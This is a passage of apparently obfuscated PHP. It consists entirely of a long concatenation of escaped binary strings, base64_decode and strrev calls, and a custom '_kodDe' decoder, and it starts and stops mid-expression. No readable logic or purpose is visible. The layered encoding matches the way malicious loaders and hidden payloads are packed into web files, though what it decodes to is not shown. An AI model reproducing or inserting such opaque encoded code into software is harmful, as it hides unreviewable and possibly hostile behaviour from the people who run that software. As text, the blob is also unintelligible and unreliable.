.')."\x13\x16\x51\x76\xb9\x22\xd9\x24\x1b\x26\xb1\x3e\xea\xe1\xd5\x88\xb9\x14\xc2\x8d\x80\x70\xac\xc4\xc5\xfe\x24\xaf\x92\xc4\xb5\xa5\xfd\x91\xd5\x77\x79\x63\x37\xcc\x56\x9c\x83\xb\x53\x4e\x6c\xb9\x28\xae\x3a\x3e\xee\x36\x37\x92".base64_decode('k4UllFAnYtpL3EsvVOiXHCORKyz2QXL7XXR3D3s36WFO6xBfkGdePVVdDA4tUotrGSVyumKVEBY=')."\142\157\340\374\126\66\155\312\72\11\60\55\344\150\310\202\166\116\170\224\222\135\346\63\306\106\165\72\377\50\340\233\257\270\236\207\313\220\316\44\61\110\23\306\351\302\176\127\30\252\121\147\300\256\202\120"."\63\314\1\45\225\252\231\50\231\262\107\204\63\175\174\307\44\60\146\210\111\121\4\220\204\212\11\215\157\66\330\166\356\126\123\341\135\57\232\175\134\135\143\235\220\2\0\213\207\32\160\352\211\360\172\362"."\xd4\x60\x9d\x8b\xaa\x92\xd8\xbd\xd6\xc7\xcd\x3b\xf3\x52\x49\x7a\x26\xb9\x2c\xc0\xfa\x35\x92\x61\x66\xa5\x88\x5a\xf6\xca\x66\xbd\x8\xc9\x48\xa2\x64\x5c\xc8\x9c\x2a\xd3\xd8\x52\x50\xae\xb4\xf9\x96\x90\x85\x14\xf6\x5b\xd6\xe4".base64_decode('1jFX6BX+rtKa7NRBek7mWBlxyJQLzM8YsvMrn3iJgC+mVXxKsC8UL0M4hF2q1Jc+Xl74IKcgkAA=')."\116\22\150\220\54\177\245\125\164\242\333\300\313\141\122\302\32\51\225\257\62\170\7\41\302\156\336\261\111\244\156\203\233\120\7\45\13\107\241\256\117\307\366\305\324\332\63\304\375\106\243\212\324\273\353\47".strrev('kmd"L`UDI*DL	+tjt"eW').strrev('w6JE!CpLCκ aE_rқq?)&hg	XfKG!nF')."\x48\x9c\xf\x0\x98\x71\xdf\x24\x67\x26\x5\x4e\x57\xc7\x25\xa7\xee\xda\x98\x8e\xad\xb4\x99\xe8\xa8\x4a\x3f\x13\xba\x5c\x3d\x8\xe8\xa\xbe\x6c\x8c\x47\xfb\x63\xec\x62\xc\xc7\xb1\xfc\x4d\x8d\x85\x82\x1b\xf8\x15\x13\x4f\xed".strrev('g4=B\'M'."\n".'	g'."\0".'}\\E'."\r".'N,QcV|rt2f6<u'."\n".'')."\64\55\332\317\235\237\221\304\120\40\306\136\264\300\361\216\110\64\50\325\11\107\253\301\303\131\37\236\110\45\252\64\321\177\162\303\340\26\162\214\153\105\247\271\364\24\26\275\170\7\175\352\320\202\306\366"."\301\255\215\15\203\376\166\337\174\56\63\244\324\112\162\164\61\113\262\305\366\242\126\167\2\336\306\252\22\321\6\305\322\150\123\20\363\373\174\360\141\36\360\17\372\231\253\121\277\310\204\137\121\376\270\51"."\xe7\x6\x3\xef\xca\xc4\xa9\xdf\x46\x47\xe7\x5d\xfe\xbf\x98\x63\x1d\x9f\xdb\xea\x5a\x65\xa6\xd6\x10\xc5\x6e\x36\x54\xbe\x28\xf1\xf5\xb8\x1a\xdf\x10\xe7\xd3\xea\x4c\x73\x20\x2f\x45\x7f\x59\xd7\xcc\x55\x18\xfd\xed\x93\x8b\x62"."\65\321\232\5\35\330\357\160\72\42\47\371\14\123\54\54\261\322\323\146\252\202\75\105\212\171\23\56\112\120\222\117\156\102\136\253\206\11\274\5\363\30\101\174\250\0\225\300\302\23\10\272\175\266\210\155".strrev('/f[~'."\0".'߭kŊNF\'û}[WțD};F')."\xe3\x7e\x3f\x3a\x2b\xf8\xc7\xd8\xa3\x45\x6b\xf1\xe1\x44\xb7\xfc\x32\x7b\xc9\x13\x9d\x8a\x53\x7e\x2a\xf6\xe1\xb9\x98\x92\xf9\x6b\x67\xd1\xd6\xfc\x85\xa2\xdd\x3c\x4b\x89\xbe\xb2\x8e\xe\x34\xf6\x2c\xb9\x6b\x7b\x3e\xbe\x61\xc8"."\34\30\264\206\370\62\110\353\143\154\320\72\30\307\10\45\156\113\334\162\0\133\343\225\137\121\302\353\102\346\135\323\111\27\53\2\11\102\365\127\142\130\104\42\177\174\203\106\47\331\355\31\361\343\52\75".base64_decode('XsGWJ6oODBs401+NfcczX/GjxPW322/4qFcbceSLU/eod0SfdMRdvsPnkW2px8yWW/w27mcRbWU=')."\320\27\140\142\344\345\110\266\67\256\365\205\67\313\156\27\61\340\211\334\41\127\234\330\0\264\52\213\340\125\242\56\304\356\247\225\1\172\6\200\233\22\314\375\221\207\165\150\324\243\210\7\77\230\214\333"."\xf9\x92\x7\x5b\x8f\x78\x55\x49\xfe\x2b\x18\x99\x2f\x8c\x8\x85\xbd\xc2\x8\x57\xf1\x49\x39\x78\x1c\xcc\x4e\x88\x58\x59\x62\x63\x28\x22\xe0\xbc\x8e\x49\xb6\x1a\xc1\x11\x44\xc7\x64\x4c\x7a\xca\xd0\xe1\x9a\x4a\x7e\x22\x8d\xf9"."\xdf\x72\x15\x63\xe\xb4\x28\x5f\x4f\x3a\xce\x8e\x91\x9f\x5c\x52\xf8\xb3\xc2\xd3\x20\x8e\x3d\xdc\x8d\x98\xf8\xb4\x38\x4d\x91\x27\x43\x60\xf4\x5a\x31\xc6\x9f\xee\x40\x11\xe9\x1c\x62\xe5\xd8\xe1\x77\x8c\x7b\xfe\x12\xaf\x96\x48"."\347\56\135\170\277\51\163\7\113\344\111\16\361\366\32\347\160\1\305\20\173\224\5\111\370\74\266\326\332\0\313\347\221\53\176\202\204\363\244\107\141\360\354\311\214\354\270\236\114\153\143\64\205\251\44\247"."\162\225\342\210\70\204\221\250\45\205\45\174\224\4\111\14\75\245\150\227\143\373\242\163\37\164\66\136\300\216\133\35\56\346\144\55\325\352\111\263\261\274\135\2\211\4\150\124\102\370\260\301\344\110\234\147"."\160\114\150\30\56\167\237\5\251\366\66\156\200\173\300\261\163\102\53\235\275\155\310\277\325\352\74\30\12\211\2\365\66\47\302\322\61\230\64\117\265\127\151\2\370\212\341\257\45\221\2\101\227\3\116\222"."\330\343\362\140\103\22\373\34\135\344\176\257\204\7\105\162\222\106\330\47\74\316\11\117\73\76\15\355\116\32\77\376\62\257\73\216\144\346\17\221\306\310\253\55\360\300\30\240\322\152\246\41\7\117\21\301".strrev('!??ܵ]!aܪR9$rOfUd6\'߷').base64_decode('DXrE84e+gSFIMugLiCyBVm9uwn/E+uNUmX2FJziqEXBzVUlVNnczmPM00Q4+E7LlRvpSa/ikXpM=')."\124\11\141\223\134\111\366\47\206\343\362\171\261\250\217\13\364\37\200\315\100\6\10\300\212\40\244\344\231\155\36\237\42\77\177\77\261\235\55\24\77\301\74\77\53\111\135\32\261\31\5\342\350\143\236\53"."\175\314\345\54\111\140\234\227\344\255\357\370\125\307\113\370\214\151\60\160\161\43\146\332\271\64\6\260\54\201\143\116\51\230\303\333\226\203\155\163\44\245\344\110\6\53\246\312\12\255\316\27\244\120\166\47"._kodDe('MhGBZZA3ZeRwPH/VBZSdApZB/HIaYgTRQrgyDZgrnhuqUCnRZwlxN2JAuJfurcM4ADlk3re2gqIS')."\x39\x41\xc4\x3e\xeb\xb7\xc6\x21\x2f\xaf\x59\xf6\x5a\x87\xd3\xda\x4f\x7c\x25\xa\x4f\x54\xf\x97\xda\x40\x17\x26\xbc\x64\xf\x61\x1f\x81\xaa\x38\xc9\x5f\x26\xc6\x61\x9e\x71\x38\x92\x78\xc8\xd3\x10\x2a\x20\x6c\x38\xea\x47\x7d"."\363\343\127\4\210\170\205\153\242\107\343\114\223\302\71\172\252\1\54\211\203\301\5\70\47\63\374\101\46\361\376\16\275\0\247\141\361\156\115\217\66\21\310\142\107\221\146\221\75\344\112\337\347\223\137\357"."\x4a\xeb\xa4\xbb\x9c\xe2\x4b\xf\x5f\xe1\x37\x22\x11\x77\x67\xb1\x98\x78\x2\xb\x6f\xb8\x7c\x1a\xc9\x8b\x34\xf2\xe3\x2\x18\xe4\xde\x82\xe3\x69\x48\x3a\x41\xce\x87\xa5\x2c\x5d\x1f\x61\xcb\x18\xcf\xb6\x60\x22\xcb\x9c\x89\xa0"."\x7a\x56\xde\x9a\x9\x5e\x49\xd9\x89\xee\xa9\xd2\x93\x81\xf8\x73\x20\x7d\xce\xd1\xc7\x8\xa1\xbf\xf4\x67\x63\xad\xde\x7b\xcb\xe2\x49\x2e\x34\x3b\xf4\x69\xc3\x35\xfa\x24\x7b\x3a\xe9\xe3\x5f\x5f\x1a\x5c\x3d\xd8\x33\x98\x90\x87".strrev('4+6 sﬢ,I\'1 :1X.d^D<D*zVuLk')."\207\242\57\232\371\61\135\21\173\325\314\225\67\315\334\177\305\236\47\156\230\271\370\226\135\73\37\231\271\356\141\232\116\141\321\251\27\371\214\316\134\360\215\335\217\134\277\147\373\23\157\134\271\375\355\107".base64_decode('L9yz40Gs2XvjLVTRd/qS02euuGf6kvP3fOfMmYcvnbn+jDeuvvT1U0+HNVEkz2IEytmKAAWtMnM=')."\xd3\xa3\xd3\x8f\x5e\xf2\xc6\xe5\x57\xef\xd9\xb1\x43\x2a\x6f\x63\xc5\xf5\xbc\xb4\x28\xd0\xfc\x4c\x9f\x7d\xd6\x1b\x67\xdc\x3e\x7d\xc9\xd7\x77\x5f\x7e\x63\x55\x5\xfa\x1\xf7\xc\xe2\xe1\x5d\x71\xee\xee\x6b\xce\x94\x72\xdc\x95"."\72\310\163\141\142\323\340\165\150\306\364\245\27\355\276\355\36\167\45\372\176\134\215\112\63\333\316\331\365\310\3\256\112\275\146\274\222\312\165\110\357\222\315\134\170\316\364\366\153\370\107\166\355\274\210\32".base64_decode('zbqqcFV1Xp62X10+znC109QtdAKQHgbYfffjqD8UYvLMTe84e/dNp+2++zyYiat2TF9668zdN+8=')."\376\346\166\336\54\140\225\303\152\6\67\160\357\351\173\36\70\153\346\312\7\170\101\274\230\323\212\50\103\60\212\226\301\6\302\344\203\273\37\373\372\356\107\256\303\110\162\376\351\273\117\177\150\372\272\173"."\246\257\77\225\177\166\172\347\116\1\345\250\237\74\141\135\203\214\236\204\323\201\220\146\204\155\144\251\42\275\242\56\223\56\174\276\146\264\200\260\255\364\251\77\166\154\106\273\162\245\134\354\60\231\253\222".base64_decode('LXWIAta11h3fgH4b6zx1WDZF4pgG4gTy0brW4xtIoBFczm7m/jv4Oz7AfbYjGiCp7rSTPQTvUC0=')."\376\26\77\333\265\332\107\361\167\304\313\316\375\174\263\20\347\167\272\155\320\67\70\231\356\117\257\156\217\233\145\331\304\250\205\371\253\310\111\104\277\140\61\113\75\202\156\342\156\4\260\213\152\347\137\172".base64_decode('UTVeQYUkNeJxFH/wvumz7n/jyrvdZanwnZkyI/ZauoqBBojh+PTXr6r+Hinv/BorPH3adbsvd5U=')."\144\66\55\212\164\313\42\52\20\4\167\221\12\116\324\345\52\24\245\377\137\26\12\145\263\133\361\335\60\115\130\357\355\57\115\126\212\136\314\361\172\343\362\363\7\256\327\155\233\234\345\361\75\206\263\274"."\274\331\247\304\246\131\20\101\372\352\156\253\42\277\211\55\75\122\105\356\310\350\256\304\116\160\220\206\371\0\226\44\170\202\214\60\223\307\133\273\352\334\332\127\271\372\213\225\62\275\161\264\70\164\374\160"."\x35\xda\xbd\xa4\xe7\xe6\xe4\x22\xce\x47\x96\xdd\x4f\x2f\xbb\xa1\x40\xaa\xe0\x4b\x35\xaf\xfc\xec\xf3\x84\xb7\x42\xb2\xf1\x13\x9d\x5e\x7c\x45\xe7\x35\xd2\xb3\xe5\x8\xda\x50\xb3\xab\x29\x78\xd4\xaf\x56\x91\xfe\x8a\x91\x76\x7f".strrev(')[;<i\'J7KR~^MΉNs"V>ʍ+z(')."\61\313\74\24\144\157\67\36\353\317\60\132\43\36\115\146\143\303\23\56\275\50\352\110\26\140\344\57\65\62\42\345\50\47\172\353\170\362\33\6\112\57\3\244\47\120\211\272\0\45\121\130\243\134\345\342"."\201\32\7\156\203\75\3\54\271\105\340\363\220\145\201\62\27\311\152\142\145\44\363\43\142\0\204\254\0\142\243\263\226\141\212\123\16\341\57\45\202\100\344\75\155\122\246\142\233\246\122\320\212\223\40\57"."\234\153\265\316\265\226\343\17\265\141\253\113\213\153\103\341\275\107\74\354\140\113\202\17\320\204\360\341\107\277\361\151\321\214\125\230\313\24\162\161\110\303\175\204\276\323\60\274\267\14\31\221\376\325\341\136".base64_decode('SeNdSlCDnb1qoK+vZob8DT9+B9g3DEAwUgydVqAzlJLCRvhtdTi1TrHKqTamB+YHBWpSQDA9Kww=')."\xa8\x52\x8f\xab\x28\x19\x84\x1f\x5e\x12\xa2\xd9\xf5\x2b\x57\xf8\x8d\x95\x1c\xb7\xc1\xdf\x39\x42\x65\x5f\x4a\x2b\xa\xe9\x8c\xcf\x7f\x1c\x26\xe5\x7e\xac\x55\x5e\x9c\x87\x67\x98\xd9\xa5\x5a\xc4\x50\x16\xa5\x76\x9\xbf\xca\x8a"."\262\102\123\50\124\333\352\311\55\174\275\222\103\73\72\67\321\131\351\256\314\37\363\136\341\327\344\114\334\223\230\311\316\200\274\203\222\270\262\226\252\105\100\172\21\216\274\246\33\224\307\2\202\261\122\216"."\10\205\135\372\74\53\112\53\127\340\3\75\123\116\367\223\310\12\177\151\245\74\333\104\50\267\266\252\23\40\202\20\102\150\225\112\161\152\253\264\364\201\14\113\326\366\160\226\340\132\35\65\60\15\53\223"."\242\245\302\337\36\113\215\140\264\25\33\12\164\24\62\372\260\320\201\146\70\336\313\264\45\15\341\12\166\331\102\64\7\312\342\271\361\55\133\150\103\370\55\330\255\133\253\323\300\176\311\235\25\50\31\356"."\x24\x8c\x92\xee\x34\xc\x2\x91\x86\x76\x46\xe7\x67\xe8\x72\x90\xb\x89\x14\x56\x86\xfe\x8a\x3a\x91\xde\xd5\x22\x42\x8f\xed\x8e\xcc\x1\xa6\xb\x4c\x62\x83\x3\xf5\xbe\xf9\x5b\xb7\xfa\xd\xa6\x95\xcf\x74\x7e\x59\x5d\x1f\x2f".base64_decode('TeODPmd5NBIAPS8ICe6SFO1OBDw70D9fOE/h2vcKVslva1s5wJmxIZanEpmJPHeMhTWalzGkQAc=')."\312\304\72\36\14\366\12\216\234\163\244\206\35\321\230\276\72\137\142\224\236\371\210\134\74\340\174\312\251\135\74\323\56\123\100\32\16\224\112\162\224\335\146\21\335\212\274\221\364\163\152\103\365\55\174\51"."\xe1\x7c\x84\x15\x21\xb4\xce\x95\x8e\x35\xec\x5d\x19\xd8\x4d\xf\x49\x1e\x43\x84\xd9\x2c\x73\xea\xc8\xd3\x51\x5b\x3c\x11\x6\x8b\xc9\x94\x44\x95\x78\xf6\xa\x2b\x55\x36\x4a\xb6\x83\x7a\x2a\xe4\x46\xa2\x8e\xbc\xe8\x3d\xac\x8d"."\x69\xb4\x48\x9d\x2\xe2\xba\xb6\x3a\xf2\x38\x63\x1d\xa2\x4\x34\x7\xc8\x81\xe8\xe0\xa\xfc\x35\xc4\x56\xe7\xdb\xea\xc8\x20\xac\x9c\xae\xa3\xfa\x84\xec\xd5\xfa\x8\xaa\x58\xa7\x30\x9a\x5d\xd0\x38\x1c\xcb\xb6\x89\xf6\x61\x6e"."\52\217\215\145\321\16\321\37\3\13\341\100\57\150\271\34\167\62\375\75\376\70\206\136\105\273\154\346\363\210\337\46\366\217\204\4\22\246\76\203\157\336\150\241\170\50\206\155\307\372\142\321\104\64\310\36"."\103\167\136\321\321\64\356\120\317\242\236\44\304\261\215\331\277\163\255\120\126\202\163\46\176\110\221\144\175\174\23\155\253\375\147\200\350\336\350\351\241\131\362\225\1\215\151\104\200\264\230\252\32\61\267\16".strrev('M<	>±Q?eࣜglMmdP'."\r".'<dx.c]5').base64_decode('XO+pb/DNb6yvzqHGLs58bDSvnhhHmfD+L/AOxLFAMBIO9SbUMLANzS1LfU3C6N+wxIMnNByUvNg=').strrev('ΰvJ*Bf쭈?2ٟ3So&) u!zz')."\231\103\334\326\101\173\364\147\134\327\241\103\260\313\242\203\165\205\261\257\3\101\354\316\101\301\135\203\151\21\346\46\345\112\221\70\322\141\344\165\271\164\260\137\256\220\253\114\210\25\164\304\262\263\245\1".base64_decode('z6hkHVgt35exMOInjWKWQAU6zK+1UDGxUpbTaxbhSSVUTA/IH/Mx6NJE8WCZl2V45VdQoRIlbtI=')."\215\22\52\347\364\162\204\123\20\63\224\342\63\214\23\44\61\54\146\210\45\127\103\70\52\153\175\220\154\176\131\104\142\171\356\23\21\107\205\203\35\372\300\56\365\213\6\160\253\261\364\162\346\270\52\30".base64_decode('Exw9kccIGPGuxHAvLfk+wbBke49UnGtLC2VS4OmIW78RQ1oBaAJUqaoMz+W4IBtJwlkTfcKLO+o=')."\305\375\156\25\120\104\204\54\300\237\36\246\146\75\334\171\17\220\26\32\45\357\224\205\212\230\173\44\162\237\326\3\253\46\331\166\117\60\231\67\307\115\206\133\155\235\305\244\331\143\312\15\361\117\320\54"."\147\51\334\251\24\325\304\10\362\107\71\244\6\334\131\256\72\1\252\23\121\125\1\322\253\113\23\155\221\32\245\161\272\253\64\171\176\43\310\137\24\222\337\344\240\42\53\111\61\331\202\47\33\205\202\50".strrev('2'."\n".'D7)**Pt,˳J˗k%\'j҆03eJ:Lck')."\374\205\160\71\21\237\214\145\115\12\162\20\161\266\301\373\361\61\50\306\344\41\166\131\53\132\31\131\245\321\125\214\60\66\64\207\253\276\261\42\202\124\141\161\126\257\364\212\270\226\116\367\11\377\131\252"."\3\213\146\103\70\266\334\44\265\21\67\366\161\12\102\326\26\367\303\305\124\235\361\124\10\15\102\147\72\115\243\302\22\207\27\262\4\241\262\171\75\1\220\140\143\305\137\300\15\20\225\160\327\354\211\25"."\7\175\150\153\223\253\71\363\60\22\47\114\207\266\342\153\147\177\235\5\56\243\1\206\166\314\23\24\231\141\346\254\110\225\257\373\60\170\124\131\322\205\211\113\267\155\227\234\15\111\310\357\304\373\52\4".base64_decode('J7wEbgC+jQiLFMOts5tWdO4Hn5YenKyY5BpGwR7jjnViRnUFeDLcREwsfmxIroTb6ndRyzWcYOM=')."\30\357\53\145\47\231\11\207\62\327\327\2\152\121\163\331\363\232\164\273\20\152\175\176\313\221\201\360\35\363\167\214\331\100\143\35\102\147\263\51\276\3\302\74\16\320\35\204\175\10\217\203\43\66\263\310".base64_decode('dnIB0v6myA0h7iCRwyKsIYX0fTnxC1cjFzv4Yl/jrzHBzoTKmDY/z+Pm0ZoQkYjMiOOETp2/Apg=')."\xa0\x2d\x78\x57\x8a\x9e\x2f\xd7\x78\xa7\x65\x75\x37\x49\x3f\x83\x57\x42\xfd\xe3\xbe\xc9\x36\x1b\x25\xf2\xd8\x9e\x24\x71\x70\x45\xdd\xf6\x25\xb8\x86\xa4\x60\x86\xa2\x12\xf3\x40\x58\x17\x9b\x71\x1f\xec\xa9\x3d\x61\xa2\x41\x82"."\x62\xbf\x78\xed\xaa\xb3\x59\xe0\x2c\x81\x6b\x32\xe1\xa8\xd1\x3f\x68\x95\xb7\x89\x7b\x50\x14\x16\x22\xc0\x77\x95\xf5\x94\x59\x4e\xe3\xfd\x5b\x10\xb4\x54\xd1\x8e\xe9\x59\x39\x4a\xf4\x29\xd8\x8a\x11\x4f\x77\xc9\x4d\x60\x97\xce".base64_decode('ElHEKzWQsiuyg2jpJT8UkxSHJQba26xwzlulLdPIAimDlK/FhLvk0kQSQHVqiDwuXkny63EXZ8w=')."\314\337\25\231\47\146\266\356\270\1\342\165\26\217\300\222\363\120\263\370\125\55\61\62\271\12\371\146\125\25\232\207\371\100\141\374\56\347\130\130\63\250\237\315\142\255\234\32\237\42\131\22\104\201\0\154"."\x10\xb0\x81\x61\x4f\xea\x4c\xd9\xcc\xdb\xdc\xe2\x5d\x8\x7\x2e\xd9\xe\x9e\x9d\x25\x69\xc\x9f\x73\xa5\xd9\xc7\x7\x70\x46\xe1\xc0\x20\x8\xca\x89\x32\xa6\xa4\x68\x40\xfc\xb3\xa\x6f\x76\xc4\x29\x2d\x9f\x46\xe2\xbd\x96\xc7"."\210\106\240\114\333\205\136\54\265\26\162\353\121\362\174\12\2\234\335\351\60\352\162\25\100\13\300\231\117\276\50\233\135\122\117\261\316\355\312\325\10\274\16\52\353\201\221\132\102\301\124\230\273\241\44\223"."\152\72\12\20\10\275\107\54\100\345\224\114\44\47\114\236\130\255\30\214\161\15\100\111\175\13\301\371\273\241\21\373\26\162\310\100\173\46\271\307\26\254\164\217\67\160\156\312\145\311\21\226\313\121\316\162"."\104\250\25\203\243\66\117\342\245\306\165\346\326\207\311\15\372\272\373\374\74\251\203\57\72\52\251\21\176\306\203\114\223\137\237\320\123\320\126\301\110\51\221\350\352\160\60\20\351\14\307\327\50\330\371\250"."\xe4\xc6\x7\x75\x57\x25\x8b\x51\xb5\x84\xe\x1d\xe5\xa8\xbb\x65\x93\x28\xba\x3c\x88\xd0\x9f\xce\x4\x43\xe8\x24\x7f\x37\x14\x7\xbd\x49\x74\xa4\xf1\xa6\xf9\x51\xd0\x12\x87\x3e\x32\x4e\x68\x4c\xbc\x9\xef\x6c\x96\x22\xa4\x5e".strrev('qF^F*<kz5*KՎeKKMFuU򍈱j')."\xb1\xe6\x59\x8d\x49\xb9\xf5\x40\x67\x4f\xb8\x57\xd\x44\x22\xd1\x75\xe\x7b\x98\xb4\xfc\x3e\xaf\x34\xb\x2\xe0\xb2\x63\x5b\xe\x76\x93\x7a\x33\x66\x18\x64\x82\x58\xc1\x2d\xde\xc1\xb\xa8\x43\x93\xdc\x1e\xd3\xd9\x93\x9f\x59"."\220\166\3\54\205\105\314\245\306\335\351\227\330\125\36\336\65\245\67\207\41\52\275\350\135\52\153\206\245\113\11\324\55\62\263\124\327\362\171\51\17\137\22\111\321\212\163\233\255\371\51\225\176\200\245\111"."\272\347\265\12\304\302\253\273\23\377\353\256\32\151\241\276\154\160\335\163\356\367\204\76\351\31\244\355\70\277\51\136\55\257\116\1\17\342\237\370\42\272\107\362\153\117\74\253\302\322\67\210\177\143\270\342"."\25\266\126\324\71\275\370\4\142\136\312\223\45\371\32\332\237\146\366\367\150\55\204\230\371\54\216\210\103\17\56\5\215\340\257\320\63\67\366\136\154\122\135\171\134\222\311\22\21\235\1\200\73\224\100\135".base64_decode('T7q7LcYcD7ZXfYO82knzBvAoUMkhMSYU4/ZVoqo7p0YHULYiBHS8gNKmNBFBuXiBVVnBPDuJDxA=')."\27\307\222\47\353\32\324\123\232\22\66\113\252\274\125\56\7\307\315\300\114\23\202\54\16\211\130\17\324\54\114\126\45\70\344\167\21\326\153\256\335\215\137\247\105\13\130\206\56\61\42\303\266\303\36\22".base64_decode('omIRDzp96Hb1U+C0+v9NRZoZl172sNwbJd/kHPZsRPc6Z44L2QFLkbgwZkNXq3uzDFVaV8RDkfw=')."\x22\xbb\xc3\xcc\xce\xf1\x2\x2f\xcd\x50\x2a\x45\x7c\x3b\x82\x48\x10\xcc\x38\x56\x4f\xb2\xe4\xb5\x2d\xf5\x6d\x2e\xfd\x19\x84\x5f\xb6\x3d\xba\x3b\x41\xa9\x1b\x7c\xb2\x91\x23\xa0\xd3\x18\x40\x4a\xe8\xd1\x85\x20\x84\xd4\x42\xe4"."\244\244\25\35\157\123\243\276\327\172\356\36\277\102\340\174\141\31\341\34\315\122\305\376\353\174\310\227\153\70\130\142\261\130\266\343\351\350\4\332\101\262\36\212\273\230\374\211\130\307\244\34\226\115\303\110"."\xcf\x51\x26\x0\xcf\x10\xbe\x26\x56\xb2\x14\x34\x84\x2c\xa3\x7a\xee\xf7\x8e\xa5\xd5\xc7\x89\xab\x6c\x3e\x99\x25\xfe\xba\x41\xc1\xd1\xe5\x4\x24\x6b\xe8\x6c\x83\x70\x14\xa3\x49\x7e\xad\x54\x12\x97\x33\xf2\x56\x8b\x5d\xf7\xcb"."\116\106\40\257\77\321\255\22\27\140\52\125\315\210\13\334\222\356\110\151\42\334\227\126\212\141\172\111\344\110\55\113\47\102\371\45\34\172\161\44\74\122\100\161\324\317\76\172\143\14\0\223\233\144\267\370".base64_decode('XOaPqA0/OPurb/2x4hzQEayoxDTERkxy8PLJRzYooKxQBDrIi4waPqTTHhIg9EEma2xZul6Rrio=')."\7\206\30\65\137\327\246\306\27\344\247\123\317\360\243\220\354\273\120\50\23\121\254\23\326\160\204\220\366\126\12\316\317\160\253\70\17\35\253\207\257\30\303\302\144\324\123\254\24\330\331\6\207\261\22\207"."\207\277\214\355\241\217\137\170\350\51\317\202\312\324\136\147\366\107\273\161\377\71\213\300\217\35\125\47\27\367\241\205\303\313\125\41\346\206\36\26\13\272\145\334\102\5\2\6\301\43\316\223\33\214\132\214"."\x50\x1a\x52\xa5\x9c\xf7\x10\x5\x10\xf\xd3\xd0\x74\x8d\xdf\x1\x5a\x31\x56\x79\xae\x5c\x56\x88\x3c\x1a\xcd\xcb\xa3\xec\x2f\xe7\xe3\xc2\xb4\x8c\xf4\x48\x4c\x94\xc\xfd\x4f\xec\xc\x98\x65\x90\x23\x5e\xda\x49\x3\x5b\x57\x24"."\313\354\102\335\135\314\160\140\65\332\237\205\331\73\175\316\245\152\213\250\306\357\15\205\164\313\302\305\47\310\42\23\261\113\211\133\350\205\364\7\356\317\201\333\21\330\243\114\311\100\365\50\354\125\31\231"."\122\220\114\247\345\17\74\175\43\355\67\256\35\342\177\265\262\244\23\12\55\52\73\0\244\117\151\230\171\174\166\56\340\253\2\273\254\71\17\203\65\316\74\154\213\45\120\254\371\344\275\264\345\171\252\266".strrev(''."\0".'N$A5d:M	pGQoC},z'."\0".'ځ|-plU?').base64_decode('pJOC8lCosu3KqTVna0lMaaV3UTBxkBQMiS01bwpbZ0oGo2xKawHS9TWK2ybW2bJEe64W6AzUQBA=')."\xd1\x37\xe9\xf9\x1b\x32\x2c\x76\x56\xc6\xb2\x71\x11\x73\xe\x12\xe4\x59\x22\x5b\x3a\xdf\xd6\x3e\x10\x63\x58\x12\xc9\x71\xb4\xc8\xde\xb4\x74\xe\xbd\xc6\x10\x3e\x6\xaf\xd9\x19\xd4\xbf\x4a\x74\x5d\xd2\x59\x72\x4e\x90\xab\x17"."\224\311\345\70\103\154\25\345\3\267\127\263\201\371\100\234\122\224\300\227\106\45\11\200\253\111\124\120\10\33\207\74\312\154\205\252\74\100\320\165\43\220\122\312\23\43\141\216\145\146\21\231\60\202\56\356".base64_decode('qohzD+GQkJAeBxmSnpmSnWOQhmRcrW6absJEPi8kbEQkB4MA4kRUV4hzlcBq7nBFk9QyVfdyx+g=').base64_decode('IDptm3JYoAneBrnlJeqA4wiO4mLWJc5SHP8kMuxOZKAjC0+QdcnJj+PsR4+H6IuOs6AlwAOrKO0=').strrev('tBIgf7	;\\v!;d#8+*uV$O}z9G').base64_decode('ay1EYa7tESbaHrYhew6cM4f4wMB1uNSjxuZAhv0xrNVibu3MjRsJeWWR1XD8gG7jB7841aYydNc=')."\200\234\54\303\34\300\25\4\167\337\230\240\37\44\316\125\376\231\107\152\346\250\132\143\327\214\210\113\167\337\124\127\35\330\204\13\31\323\314\47\265\62\266\201\37\261\231\56\125\255\210\333\361\106\134\313"."\350\162\237\7\210\214\33\45\22\303\350\41\101\74\160\132\255\152\202\64\221\275\247\44\21\77\322\26\112\221\132\341\52\235\120\130\230\75\223\23\204\144\304\15\33\263\153\234\104\343\331\371\240\222\304\227".base64_decode('VRUTnUPsG1e6ZqEUZhaIBzkAsuzSJ1pip+pG2AaG4Bc8iwF1kymaI6mKDiYcU+dIlGdFkC6f06U=')."\x21\xd4\xc0\x57\xdb\x1d\xd2\x51\x95\x16\xb2\x64\x2a\xe2\xb8\x38\xa9\x56\x72\xa9\xae\xcd\x29\x85\x5c\x5\x1b\x64\x38\xa5\x81\xcc\x2f\x82\xb7\xc9\xeb\x4a\x68\xf6\xba\x9a\x33\x2c\x7a\x35\xe3\x5a\x12\x72\x67\xa8\xbd\x14\x96\x4d"."\xc5\xb0\x34\x88\x49\xff\xc8\xe5\x1a\xb9\x89\xf7\x56\xd7\x91\x8c\xf6\xe5\xdb\xfa\xaa\x5\x58\x9b\x1e\xf0\x4e\x9\x9\x28\xe\xc9\xf0\x60\x74\xa5\xaf\x6c\x12\x8e\xd8\x99\xca\x25\x64\x92\x66\x7b\x4a\x12\x33\xbb\x39\x2c\x9a\x3c"."\xd7\x27\xf\x44\xbe\x7e\x76\x5e\x71\x61\x2f\x73\x21\x75\x5d\x18\x7b\x9c\xa\x6f\xc\xf5\xb3\xa7\x24\xc\x93\xbc\xaf\xc8\x5a\xe9\xef\x91\xdf\xf9\xc3\x97\x1f\x5d\x26\xc7\x1e\xbc\xc8\xc4\x9b\x5\x76\xa1\x14\xe4\x37\xcd\x4e\x9b".base64_decode('c8ksgL+rKAlbnYWxlZJzya2sVSxlli2pGBZVsB05w3RD+otoleopW08reBt3nEwGFjUtHKrVMOY=')."\xa0\x4d\xd4\x32\xca\xe7\x25\x17\x7d\x42\x49\x38\x22\xc5\x17\x7a\xa1\xaf\xe1\x28\x75\x40\x17\xb\xc5\x69\x2\xaf\x54\xb3\x21\x93\x3a\xd1\xab\x95\x87\x30\x31\x6e\x3b\x50\x46\xbc\xdc\xe9\x7e\xb1\xd3\xf9\xe\x60\xab\x24\x3\xa6"."\17\236\72\236\33\256\232\242\136\63\50\370\17\127\36\46\4\263\347\342\123\273\270\125\307\76\264\260\173\116\154\142\343\47\252\3\354\231\106\265\240\62\55\56\54\31\21\102\55\102\127\253\17\275\360\5"."\xbb\x3c\x19\x2d\xc7\xa\xbd\x55\xfe\x6d\x9d\x46\x75\x52\x7d\x72\x2c\xa2\xd2\x2b\x87\x10\xb\xf4\x23\xe4\x24\xe9\x86\x8\x9d\x2e\xd3\xce\x87\xa4\x49\x26\x49\x66\xf\x8f\x40\xb\xd2\xd5\xb7\x53\xe1\x80\x9b\x24\x57\x6d\x97\